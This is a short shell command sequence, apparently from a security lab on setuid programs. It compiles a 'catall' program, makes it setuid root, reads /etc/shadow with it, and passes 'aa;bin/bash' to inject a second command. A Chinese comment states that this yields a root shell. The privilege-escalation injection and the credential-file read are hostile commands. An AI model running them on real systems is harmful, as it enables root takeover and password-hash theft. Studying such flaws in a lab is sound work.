gcc --version
gcc ./system/catall.c -o ./system/catall
sudo chown root catall
sudo chmod 4755 catall
ls -l catall
./catall /etc/shadow    
./catall "aa;bin/bash"  # 会重新起一个bin/bash指令， 但是此时该bin/bash指令拥有root权限